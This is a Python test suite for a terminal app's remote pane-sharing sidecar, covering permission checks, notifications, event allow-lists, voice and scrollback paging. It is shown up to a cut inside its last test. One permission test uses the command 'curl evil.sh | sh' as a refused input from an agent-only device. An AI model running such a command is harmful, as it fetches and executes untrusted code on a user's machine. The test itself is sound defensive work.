# SPDX-License-Identifier: AGPL-3.0-or-later
"""The sidecar Relay runs when you share a pane (remote/gui_host.py).

The GUI owns the panes, so everything here is about what crosses the stdio line: screen frames in,
prompts and keystrokes out, worker events forwarded under the same allow-list as any other client.
These are the paths behind "agent commands didn't work" — a prompt from a phone has to come back
out of this process as a `compose` for the pane.
"""
import asyncio
import contextlib
import functools
import json
import os
import socket
import tempfile
import unittest
import urllib.request
from pathlib import Path
from unittest import mock

from remote import client as client_mod
from remote import gui_host, host as host_mod, identity as identity_mod, \
    notify as notify_mod, wire
from rendezvous.server import Store, build

APP_DIR = Path(__file__).resolve().parent.parent / "app"


def closed_port() -> int:
    """A loopback port nothing is listening on."""
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


async def desktops(base: str) -> int:
    """How many desktops a rendezvous has attached right now."""
    def go() -> int:
        with urllib.request.urlopen(f"{base}/v1/health", timeout=10) as answer:
            return json.loads(answer.read())["desktops"]
    return await asyncio.to_thread(go)


class Harness:
    """A hub over a GuiPaneSource, with the GUI's side of the pipe as a list of messages."""

    def __init__(self, capability=wire.FULL, panes=("p1",), admit=False):
        self.capability = capability
        self.panes = panes
        self.admit = admit
        self.to_gui: list[dict] = []

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store, static_root=APP_DIR)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(directory)
        self.devices = identity_mod.DeviceStore(directory)
        self.source = gui_host.GuiPaneSource(self.to_gui.append)
        for pane in self.panes:
            self.add_pane(pane)

        async def approver(request):
            return True, self.capability

        async def knock_approver(request):
            return self.admit, request.role

        self.host = host_mod.Host(self.identity, self.devices, self.source, app_base=self.base,
                                  approver=approver, knock_approver=knock_approver,
                                  name="test desktop")
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    def add_pane(self, pane: str) -> None:
        """What the GUI does for every pane while always-on is on: publish it, unasked."""
        self.source.set_pane({"id": pane, "title": "relay-terminal", "cwd": "/home/elliott",
                              "rows": 24, "cols": 80, "status": "idle"})
        self.source.set_frame({"pane": pane, "full": True, "rows": 24, "cols": 80, "alt": False,
                               "cursor": {"row": 0, "col": 2, "visible": True, "shape": 0},
                               "lines": [{"row": 0, "segs": [["$ ", 0, 0, 0]]}]})

    async def guest(self, panes, role=wire.VIEWER, name="alice"):
        """An invite to `panes`, knocked on and admitted: a connected participant."""
        self.admit = True
        _, url = await self.host.invite_create(list(panes), role)
        client = client_mod.Client(self.base)
        joined = await client.knock(url, name=name, platform="Chrome")
        return client, joined

    async def paired_client(self):
        url, _ = await self.host.open_pairing()
        pairing = client_mod.Client(self.base)
        record = await pairing.pair(url, name="iPad", platform="Safari")
        await pairing.close()
        client = client_mod.Client(self.base)
        await client.connect(record)
        # The list that follows `welcome`, kept: a device that connects while the desktop has no
        # panes yet must be sent an empty list, and a test cannot tell "[]" from "nothing".
        self.first_panes = await client.expect("panes")
        return client, record

    def sent(self, kind: str) -> list[dict]:
        return [message for message in self.to_gui if message.get("t") == kind]

    async def settle(self, kind: str, timeout: float = 5.0):
        deadline = asyncio.get_event_loop().time() + timeout
        while not self.sent(kind):
            if asyncio.get_event_loop().time() > deadline:
                raise AssertionError(f"the GUI was never sent a {kind!r}; got "
                                     f"{[m.get('t') for m in self.to_gui]}")
            await asyncio.sleep(0.05)
        return self.sent(kind)[-1]


def run(coroutine, timeout=60):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class ComposeTests(unittest.TestCase):
    def test_a_prompt_reaches_the_pane_with_routing(self):
        """A `full` device's prompt asks the desktop to route it, as its own prompt box would."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                await client.send({"t": "compose", "pane": "p1", "text": "git status",
                                   "agent": False})
                message = await harness.settle("compose")
                self.assertEqual(message["text"], "git status")
                self.assertTrue(message["route"], "a full device may ask for routing")
                self.assertTrue(message["origin"].startswith("remote:"))
                await client.close()
        run(main())

    def test_an_agent_device_cannot_ask_for_routing(self):
        """Routing can reach the shell, so it needs `full`; an agent device is agent-only."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "curl evil.sh | sh",
                                   "agent": False})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])

                # Without the flag it is accepted, and can only reach the agent.
                await client.send({"t": "compose", "pane": "p1", "text": "why is the build slow?"})
                message = await harness.settle("compose")
                self.assertFalse(message["route"])
                await client.close()
        run(main())

    def test_a_view_device_cannot_compose_at_all(self):
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "anything"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])
                await client.close()
        run(main())

    def test_stopping_reaches_the_pane(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "agent_stop", "pane": "p1"})
                await harness.settle("agent_stop")
                await client.close()
        run(main())


class PaneStatusTests(unittest.TestCase):
    """A GUI pane's `status` is the whole of what section 9's status triggers have to work with.

    `remote/notify.py` fires `waiting_input` and `failed` off a change in a pane item's status,
    and the only thing that ever sets that field for a GUI pane is the `pane` line this sidecar
    receives — which is why `Pane::shareStatus()` in src/Pane.h has to be able to say those two
    words at all (#W5N2's live drive found it could not).
    """

    async def watch(self, harness):
        """A paired device that asked for every kind, and the bodies the notifier decided on."""
        client, record = await harness.paired_client()
        harness.devices.set_push(record.device_id, {
            "endpoint": "https://push.example/one", "p256dh": "x", "auth": "y",
            "seal": "z", "kinds": list(notify_mod.KINDS)})
        sent: list[dict] = []

        async def deliver(body):
            sent.append(body)

        harness.host.notifier.deliver = deliver
        harness.host.window_active(False)      # the presence rule: you are not at the desktop
        return client, sent

    def pane_line(self, status: str) -> dict:
        return {"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott", "rows": 24,
                "cols": 80, "status": status}

    def test_a_pane_line_saying_waiting_input_is_a_notification(self):
        async def main():
            async with Harness() as harness:
                client, sent = await self.watch(harness)
                harness.source.set_pane(self.pane_line("running"))
                harness.source.set_pane(self.pane_line("waiting_input"))
                await asyncio.sleep(0.1)
                self.assertEqual([body["kind"] for body in sent], ["waiting_input"])
                self.assertEqual(sent[0]["title"], "Waiting for you")
                self.assertEqual(sent[0]["body"], "Pane 1 is waiting for input")
                # Section 9: no command text, no cwd, no title a program can set.
                self.assertNotIn("relay-terminal", str(sent[0]))
                self.assertNotIn("/home/elliott", str(sent[0]))
                # And the phone is told the same word in its pane list.
                for _ in range(10):
                    panes = await client.expect("panes", timeout=10)
                    item = next(row for row in panes["items"] if row["id"] == "p1")
                    if item["status"] == "waiting_input":
                        break
                self.assertEqual(item["status"], "waiting_input")
                await client.close()
        run(main())

    def test_a_pane_line_saying_failed_is_a_notification_too(self):
        async def main():
            async with Harness() as harness:
                client, sent = await self.watch(harness)
                harness.source.set_pane(self.pane_line("running"))
                harness.source.set_pane(self.pane_line("failed"))
                await asyncio.sleep(0.1)
                self.assertEqual([body["kind"] for body in sent], ["failed"])
                self.assertEqual(sent[0]["title"], "That turn failed")
                await client.close()
        run(main())

    def test_the_same_status_twice_is_one_notification(self):
        """The GUI republishes a pane line about once a second; only a change is news."""
        async def main():
            async with Harness() as harness:
                client, sent = await self.watch(harness)
                harness.source.set_pane(self.pane_line("running"))
                harness.source.set_pane(self.pane_line("waiting_input"))
                harness.source.set_pane(self.pane_line("waiting_input"))
                await asyncio.sleep(0.1)
                self.assertEqual(len(sent), 1)
                await client.close()
        run(main())


class AgentEventTests(unittest.TestCase):
    def test_worker_events_reach_a_focused_client(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("p1", {"event": "agent_started", "turn_id": "t1"})
                message = await client.expect("agent")
                self.assertEqual(message["event"]["event"], "agent_started")
                await client.close()
        run(main())

    def test_withheld_events_do_not_leave_the_desktop(self):
        """The allow-list applies to GUI panes exactly as it does to any other source."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                for name in ("key_stored", "configured", "presets", "state_loaded"):
                    harness.source.agent_event("p1", {"event": name, "secret": "sk-live-123"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] != "agent":
                        continue
                    self.assertTrue(wire.may_forward(message["event"]["event"]),
                                    message["event"]["event"])
                    if message["event"].get("text") == "marker":
                        break
                await client.close()
        run(main())

    def test_an_event_for_an_unshared_pane_is_dropped(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("not-shared", {"event": "delta", "text": "leak"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                message = await client.expect("agent")
                self.assertEqual(message["event"].get("text"), "marker")
                await client.close()
        run(main())


class ScreenTests(unittest.TestCase):
    def test_a_late_client_gets_the_frame_the_gui_already_sent(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                snapshot = await client.expect("screen_snapshot")
                self.assertEqual(snapshot["cols"], 80)
                self.assertEqual(snapshot["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())

    def test_a_diff_updates_only_its_rows(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.set_frame({"pane": "p1", "full": False,
                                          "cursor": {"row": 1, "col": 0, "visible": True},
                                          "lines": [{"row": 1, "segs": [["hello", 0, 0, 0]]}]})
                diff = await client.expect("screen_diff")
                self.assertEqual([line["row"] for line in diff["lines"]], [1])
                # And the kept copy still has row 0, for whoever connects next.
                self.assertEqual(harness.source.screens["p1"]["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())


if __name__ == "__main__":
    unittest.main()


class VoiceTests(unittest.TestCase):
    """A clip from a phone reaches the GUI as `voice`; the worker's text returns to the phone."""

    def test_a_clip_round_trips_through_the_panes_worker(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "voice", "pane": "p1", "format": "webm",
                                   "data": "aGVsbG8gY2xpcA==", "id": "v1"})
                clip = await harness.settle("voice")
                self.assertEqual(clip["pane"], "p1")
                self.assertEqual(clip["format"], "webm")
                self.assertEqual(clip["data"], "aGVsbG8gY2xpcA==")

                harness.source.voice_reply({"t": "transcribed", "pane": "p1", "ok": True,
                                            "text": "run the tests"})
                reply = await client.expect("agent")
                self.assertEqual(reply["event"]["event"], "transcribed")
                self.assertEqual(reply["event"]["text"], "run the tests")
                await client.close()
        run(main())

    def test_a_failed_transcription_is_an_error_not_a_hang(self):
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "voice", "pane": "p1", "format": "webm",
                                   "data": "aGVsbG8gY2xpcA==", "id": "v2"})
                await harness.settle("voice")
                harness.source.voice_reply({"t": "transcribed", "pane": "p1", "ok": False,
                                            "error": "no_key"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("agent")
                self.assertIn("no_key", caught.exception.message)   # the worker's own code
                await client.close()
        run(main())

    # The two below go straight at the source: one channel reads its own messages in order, so
    # two clips only overlap when they come from two devices, and the failure they are about is
    # the sidecar's bookkeeping rather than the hub's.

    def source(self):
        lines: list[dict] = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                         "rows": 24, "cols": 80, "status": "idle"})
        return source, lines

    def test_two_clips_in_flight_get_their_own_answers(self):
        """An iPad and a phone record at once; neither may be given the other's words."""
        async def main():
            source, lines = self.source()
            first = asyncio.ensure_future(source.transcribe("p1", b"one", "webm"))
            second = asyncio.ensure_future(source.transcribe("p1", b"two", "m4a"))
            for _ in range(100):
                await asyncio.sleep(0.01)
                if len([line for line in lines if line["t"] == "voice"]) == 2:
                    break
            clips = [line for line in lines if line["t"] == "voice"]
            self.assertEqual(len(clips), 2)
            self.assertNotEqual(clips[0]["id"], clips[1]["id"])
            # Answered out of order, as two workers finishing at their own pace would.
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": clips[1]["id"],
                                "ok": True, "text": "the second clip"})
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": clips[0]["id"],
                                "ok": True, "text": "the first clip"})
            self.assertEqual(await first, "the first clip")
            self.assertEqual(await second, "the second clip")
            # An answer for an id nobody is waiting on is dropped, not given to the next clip.
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": "v99", "ok": True,
                                "text": "stale"})
            self.assertEqual(source._voice, {})
        run(main())

    def test_a_clip_the_gui_never_answers_times_out(self):
        """A wedged desktop is an error the phone can show, not a spinner that never stops."""
        async def main():
            source, _ = self.source()
            original = gui_host.VOICE_TIMEOUT
            gui_host.VOICE_TIMEOUT = 0.2
            try:
                with self.assertRaises(wire.WireError) as caught:
                    await source.transcribe("p1", b"clip", "webm")
            finally:
                gui_host.VOICE_TIMEOUT = original
            self.assertIn("in time", caught.exception.message)
            self.assertEqual(source._voice, {}, "the pending clip must not be left behind")
        run(main())


def page(from_row: int, count: int, total: int) -> dict:
    """What the GUI would answer: `count` rows of scrollback starting at `from_row`."""
    return {"ok": True, "from_row": from_row, "total": total, "more": from_row > 0,
            "lines": [{"row": from_row + n, "segs": [[f"line-{from_row + n}", 0, 0, 0]]}
                      for n in range(count)]}


class HistoryTests(unittest.TestCase):
    """Scrollback paging across the stdio line (docs/REMOTE-PROTOCOL.md section 6.5).

    The GUI owns the emulator, so a page is a request to it and an answer back by id. What these
    are about is that the answer reaches the device that asked, that a wedged GUI is an error
    rather than a spinner, and that a pane nobody shared cannot be paged at all.
    """

    def test_a_desktop_with_panes_says_it_has_scrollback(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "hello"})
                welcome = await client.expect("welcome")
                self.assertIn("history", welcome["features"])
                await client.close()
        run(main())

    def test_every_frame_says_where_the_screen_sits_in_the_scrollback(self):
        """Without `base` a client holding history cannot tell where its rows stop.

        Output pushes lines off the live screen into the scrollback; the live block then starts
        further down and the rows in between are in neither half. `base` is what closes that seam,
        so it rides on every frame, a diff included, and on a late joiner's snapshot.
        """
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                snapshot = await client.expect("screen_snapshot")
                self.assertEqual(snapshot["base"], 0)
                self.assertEqual(snapshot["history"], 0)

                harness.source.set_frame({
                    "pane": "p1", "full": False, "base": 120, "history": 120,
                    "cursor": {"row": 1, "col": 0, "visible": True, "shape": 0},
                    "lines": [{"row": 0, "segs": [["after the scroll", 0, 0, 0]]}]})
                diff = await client.expect("screen_diff")
                self.assertEqual(diff["base"], 120)
                self.assertEqual(diff["history"], 120)
                # And it is remembered, so the next device to focus the pane is told the same.
                self.assertEqual(harness.source.screen_snapshot("p1")["base"], 120)
                await client.close()
        run(main())

    def test_a_page_round_trips_and_keeps_its_id(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "before_row": 40,
                                   "count": 10, "id": "h7"})
                ask = await harness.settle("history")
                self.assertEqual(ask["pane"], "p1")
                self.assertEqual(ask["before_row"], 40)
                self.assertEqual(ask["count"], 10)
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(30, 10, 500)})
                reply = await client.expect("history")
                self.assertEqual(reply["id"], "h7")
                self.assertEqual(reply["pane"], "p1")
                self.assertEqual(reply["from_row"], 30)
                self.assertEqual(reply["total"], 500)
                self.assertTrue(reply["more"])
                self.assertEqual([row["row"] for row in reply["lines"]], list(range(30, 40)))
                await client.close()
        run(main())

    def test_the_newest_page_is_asked_for_without_a_row(self):
        """A phone that has scrolled back nowhere yet names no row; the desktop picks the end."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "count": 300, "id": "h0"})
                ask = await harness.settle("history")
                self.assertLess(ask["before_row"], 0, "no row means the newest page")
                self.assertEqual(ask["count"], 200, "the page size is capped at 200")
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(0, 5, 5)})
                reply = await client.expect("history")
                self.assertFalse(reply["more"])
                await client.close()
        run(main())

    def test_a_view_device_may_read_scrollback(self):
        """Reading what already scrolled past is watching, not typing: `view` is enough."""
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "count": 5, "id": "hv"})
                ask = await harness.settle("history")
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(0, 5, 5)})
                reply = await client.expect("history")
                self.assertEqual(reply["id"], "hv")
                self.assertEqual(len(reply["lines"]), 5)
                await client.close()
        run(main())

    def test_a_pane_nobody_shared_cannot_be_paged(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p9", "count": 5, "id": "hx"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("history")
                self.assertEqual(caught.exception.code, "no_such_pane")
                self.assertEqual(harness.sent("history"), [],
                                 "an unpaired pane id must never reach the GUI")
                await client.close()
        run(main())

    # The two below go straight at the source: one channel reads its own messages in order, so
    # two pages only overlap when two devices are paging, and what they are about is the
    # sidecar's own bookkeeping.

    def source(self):
        lines: list[dict] = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                         "rows": 24, "cols": 80, "status": "idle"})
        return source, lines

    def test_two_devices_paging_at_once_get_their_own_pages(self):
        async def main():
            source, lines = self.source()
            first = asyncio.ensure_future(source.history("p1", 100, 10))
            second = asyncio.ensure_future(source.history("p1", 40, 10))
            for _ in range(100):
                await asyncio.sleep(0.01)
                if len([line for line in lines if line["t"] == "history"]) == 2:
                    break
            asks = [line for line in lines if line["t"] == "history"]
            self.assertEqual(len(asks), 2)
            self.assertNotEqual(asks[0]["id"], asks[1]["id"])
            # Answered out of order, as a GUI serving the nearer page first would.
            source.history_reply({"t": "history_page", "id": asks[1]["id"], **page(30, 10, 500)})
            source.history_reply({"t": "history_page", "id": asks[0]["id"], **page(90, 10, 500)})
            self.assertEqual((await first)["from_row"], 90)
            self.assertEqual((await second)["from_row"], 30)
            # A page for an id nobody is waiting on is dropped, not given to the next request.
            source.history_reply({"t": "history_page", "id": "h99", **page(0, 1, 500)})
            self.assertEqual(source._history, {})
        run(main())

    def test_a_page_the_gui_never_answers_times_out(self):
        """A wedged desktop is an error the phone can show, not a scroll that never lands."""
        async def main():
            source, _ = self.source()
            original = gui_host.HISTORY_TIMEOUT
            gui_host.HISTORY_TIMEOUT = 0.2
            try:
                with self.assertRaises(wire.WireError) as caught:
                    await source.history("p1", -1, 40)
            finally:
                gui_host.HISTORY_TIMEOUT = original
            self.assertIn("in time", caught.exception.message)
            self.assertEqual(source._history, {}, "the pending page must not be left behind")
        run(main())


# ---- every pane, to the owner's own devices only (§8.1) -------------------------------------------

class AutoPublishTests(unittest.TestCase):
    """Always-on publishes **every** pane, with no share button pressed, so the two rules that
    used to be a side effect of "only what you shared exists" have to hold on their own: a guest
    sees the panes of their invite and no others, and a device that arrives before there is
    anything to see gets an empty list rather than nothing at all."""

    def test_a_guest_sees_only_the_panes_of_their_invite(self):
        async def main():
            async with Harness(panes=("p1", "p2", "p3")) as harness:
                device, _ = await harness.paired_client()
                guest, joined = await harness.guest(("p2",))
                self.assertEqual(joined.panes, ["p2"])
                welcome = await guest.expect("panes")
                self.assertEqual([item["id"] for item in welcome["items"]], ["p2"],
                                 "three panes are published; the invite names one")
                # And a pane opened afterwards does not appear either.
                harness.add_pane("p4")
                await asyncio.sleep(0.3)
                await guest.send({"t": "panes_get"})
                later = await guest.expect("panes")
                self.assertEqual([item["id"] for item in later["items"]], ["p2"])
                # The owner's own device sees all four, and the guest is not counted as a device.
                await device.send({"t": "panes_get"})
                mine = await device.expect("panes")
                self.assertEqual(sorted(item["id"] for item in mine["items"]),
                                 ["p1", "p2", "p3", "p4"])
                self.assertEqual(harness.host.devices_online(), 1,
                                 "a guest is a participant, never one of the owner's devices")
                await guest.close()
                await device.close()
        run(main())

    def test_a_device_that_connects_with_no_panes_gets_an_empty_list_and_then_the_updates(self):
        async def main():
            async with Harness(panes=()) as harness:
                client, _ = await harness.paired_client()
                # `paired_client` already took the `panes` that follows `welcome`.
                self.assertEqual(harness.first_panes["items"], [],
                                 "an empty list, not silence")
                harness.add_pane("p7")
                message = await client.expect("panes")
                self.assertEqual([item["id"] for item in message["items"]], ["p7"])
                harness.source.drop_pane("p7")
                gone = await client.expect("panes")
                self.assertEqual(gone["items"], [])
                await client.close()
        run(main())


# ---- always on: the switch, the address and `remote_state` (§8.1) -------------------------------

class Always:
    """The sidecar as Options › Remote's switch starts it: `start` with `always` and an address.

    A second local rendezvous stands in for https://join.relay-terminal.ai through
    RELAY_HOSTED_RENDEZVOUS, as `tests/test_remote_hosted_address.py` does. Identity, device store
    and tailnet detection are all patched before `start` runs: it loads the identity with no
    directory, which on this machine is the owner's real profile and keyring.
    """

    def __init__(self, *, address="relay-terminal.ai", always=True, hosted_up=True,
                 tailnet=""):
        self.address, self.always, self.hosted_up = address, always, hosted_up
        self.tailnet = tailnet          # a tailnet name `tailscale serve` would publish under

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.directory = Path(self.temporary.name)
        (self.directory / "xdg").mkdir()
        self.patches = contextlib.ExitStack()

        self.hosted_store = Store(":memory:")
        self.hosted_server = build(self.hosted_store, static_root=APP_DIR)
        await self.hosted_server.start("127.0.0.1", 0)
        self.hosted_port = self.hosted_server.port
        self.hosted = (f"http://127.0.0.1:{self.hosted_port}" if self.hosted_up
                       else f"http://127.0.0.1:{closed_port()}")

        state = self.directory
        self.patches.enter_context(mock.patch.dict(os.environ, {
            "RELAY_HOSTED_RENDEZVOUS": self.hosted,
            "XDG_DATA_HOME": str(self.directory / "xdg"),
            "RELAY_KEYRING": "off"}))
        self.patches.enter_context(mock.patch.object(
            gui_host.identity_mod.Identity, "load_or_create",
            classmethod(lambda cls, directory=None: identity_mod.Identity.create(state))))
        self.patches.enter_context(mock.patch.object(
            gui_host.identity_mod, "DeviceStore",
            functools.partial(identity_mod.DeviceStore, state)))
        found = (gui_host.tailnet_mod.Tailnet(name=self.tailnet, ready=True) if self.tailnet
                 else gui_host.tailnet_mod.Tailnet(reason="tailscale is not installed."))
        self.patches.enter_context(mock.patch.object(
            gui_host.tailnet_mod, "probe", lambda: found))
        self.patches.enter_context(mock.patch.object(
            gui_host.tailnet_mod, "publish",
            lambda port: (f"https://{self.tailnet}", "") if self.tailnet else (None, "no.")))
        self.patches.enter_context(mock.patch.object(
            gui_host.tailnet_mod, "unpublish", lambda: None))
        self.patches.enter_context(mock.patch.object(
            gui_host.email_mod, "notify_joined", lambda *a, **k: (True, "")))

        self.side = gui_host.Sidecar()
        self.out: list[dict] = []
        self.side.emit = self.out.append
        self.side.source.send = self.out.append
        self.side.retry_min, self.side.retry_max = 0.05, 0.2
        await self.side.start({"port": 0, "tls": False, "name": "test desktop",
                               "always": self.always, "address": self.address})
        if self.side.host is not None:
            self.side.host.reconnect_min, self.side.host.reconnect_max = 0.05, 0.2
        self.local = self.side.local
        return self

    async def __aexit__(self, *exc):
        try:
            await self.side.stop()
            with contextlib.suppress(asyncio.TimeoutError):
                await asyncio.wait_for(self.hosted_server.close(), 5)
            self.hosted_store.close()
        finally:
            self.patches.close()
            self.temporary.cleanup()

    def states(self) -> list[dict]:
        return [message for message in self.out if message.get("t") == "remote_state"]

    def state(self) -> dict:
        return self.states()[-1]

    async def until(self, predicate, timeout=20.0, what="the condition"):
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout
        while not predicate():
            if loop.time() > deadline:
                raise AssertionError(f"{what} was never reached; states={self.states()}")
            await asyncio.sleep(0.02)

    async def restart_hosted(self):
        """relay-terminal.ai restarts: it forgets every desktop, and the link drops.

        The registry is emptied rather than the process replaced, which is the half that matters
        here — the token this desktop holds stops being one the server knows, so dialing again
        with it is refused 4401 for ever. `tests/test_remote_host.py` restarts the listener too.
        """
        self.hosted_store.db.execute("DELETE FROM desktops")
        self.hosted_store.db.commit()
        if self.side.host is not None and self.side.host.socket is not None:
            await self.side.host.socket.close()

    async def phone(self):
        """Pair one of the owner's devices through the hosted origin and connect it."""
        await self.side.pair()
        url = [m for m in self.out if m.get("t") == "pairing"][-1]["url"]
        asks = len([m for m in self.out if m.get("t") == "ask"])
        pairing = client_mod.Client(self.hosted)
        task = asyncio.create_task(pairing.pair(url, name="iPhone", platform="Safari"))
        await self.until(lambda: len([m for m in self.out if m.get("t") == "ask"]) > asks,
                         what="the pairing dialog")
        ask = [m for m in self.out if m.get("t") == "ask"][-1]
        await self.side.handle({"t": "answer", "id": ask["id"], "allow": True,
                                "capability": wire.FULL})
        record = await asyncio.wait_for(task, 20)
        await pairing.close()
        client = client_mod.Client(self.hosted)
        await client.connect(record)
        await client.expect("panes")
        return client, record


class AlwaysOnTests(unittest.TestCase):
    """Gap A of card #PH0N: "nothing is shared until the share button is pressed, in this Relay
    session". With `always`, `start` alone brings the service up at the remembered address, keeps
    it registered there across a rendezvous restart, and reports every change as `remote_state`."""

    def test_start_with_always_brings_the_service_up_at_the_hosted_rendezvous(self):
        async def main():
            async with Always() as h:
                await h.until(lambda: h.state()["online"], what="online at the hosted rendezvous")
                state = h.state()
                self.assertEqual(state, {"t": "remote_state", "on": True,
                                         "address": "relay-terminal.ai", "base": h.hosted,
                                         "online": True, "devices": 0, "reason": ""})
                self.assertTrue(h.side.served_by_hosted)
                self.assertEqual(h.side.host.rendezvous, h.hosted)
                # No share was asked for: a pane published now is simply there for the phone.
                await h.side.handle({"t": "pane", "id": "p1", "title": "relay-terminal",
                                     "cwd": "/tmp", "rows": 24, "cols": 80, "status": "idle"})
                client, _ = await h.phone()
                await h.until(lambda: h.state()["devices"] == 1, what="the phone counted")
                self.assertTrue(h.state()["online"])
                await client.send({"t": "panes_get"})
                listed = await client.expect("panes")
                self.assertEqual([item["id"] for item in listed["items"]], ["p1"])
                await client.close()
                await h.until(lambda: h.state()["devices"] == 0, what="the phone gone")
        run(main(), timeout=90)

    def test_a_rendezvous_restart_flips_online_false_then_true(self):
        async def main():
            async with Always() as h:
                await h.until(lambda: h.state()["online"], what="online")
                first = h.side.host.token
                before = len(h.states())
                await h.restart_hosted()
                # The whole outage can be over before the next poll, so it is the record of
                # states the GUI was sent that is asserted on, not whatever the tail says now.
                await h.until(lambda: any(not state["online"] for state in h.states()[before:]),
                              what="an outage the GUI can see")
                offline = [state for state in h.states()[before:] if not state["online"]][-1]
                self.assertTrue(offline["reason"].endswith("."), offline["reason"])
                self.assertTrue(offline["on"], "the switch is still on while the link is down")
                self.assertEqual(offline["address"], "relay-terminal.ai",
                                 "it never falls back to another address on its own")

                await h.until(lambda: h.state()["online"], what="back online")
                self.assertNotEqual(h.side.host.token, first, "it registered again")
                self.assertEqual(h.side.host.rendezvous, h.hosted)
                self.assertEqual(h.state()["reason"], "")
        run(main(), timeout=90)

    def test_a_hosted_rendezvous_that_is_down_says_why_and_keeps_trying(self):
        async def main():
            async with Always(hosted_up=False) as h:
                await h.until(lambda: any("did not answer" in state["reason"]
                                          for state in h.states()),
                              what="a state saying why it is not up")
                state = [s for s in h.states() if "did not answer" in s["reason"]][-1]
                self.assertTrue(state["on"], "the switch is on; it simply is not there yet")
                self.assertFalse(state["online"])
                self.assertTrue(state["reason"].endswith("."), "one sentence")
                self.assertFalse(h.side.served_by_hosted)
                # It never quietly became a local-only desktop: the hub is still at its own
                # rendezvous because that is where it starts, and the wish is unchanged.
                self.assertEqual(h.side.wish, "relay-terminal.ai")
                self.assertTrue(h.side.always)
                # And it is still trying: the loop is alive, not finished.
                self.assertFalse(h.side._bringing.done())
        run(main(), timeout=90)

    def test_stop_turns_the_service_off_and_says_so(self):
        async def main():
            async with Always() as h:
                await h.until(lambda: h.state()["online"], what="online")
                await h.side.handle({"t": "stop"})
                state = h.state()
                self.assertEqual(state["on"], False)
                self.assertEqual(state["online"], False)
                self.assertEqual(state["devices"], 0)
                self.assertEqual(state["reason"], "remote control is off.")
                self.assertFalse(h.side.always)
                self.assertIsNone(h.side.host)
                self.assertEqual(await desktops(h.hosted), 0, "the registration is dropped")
        run(main(), timeout=90)

    def test_the_switch_can_come_on_over_a_share_that_is_already_running(self):
        """Options › Remote turned on while a pane was already shared: one hub, a new address."""
        async def main():
            async with Always(always=False, address="") as h:
                self.assertFalse(h.state()["on"])
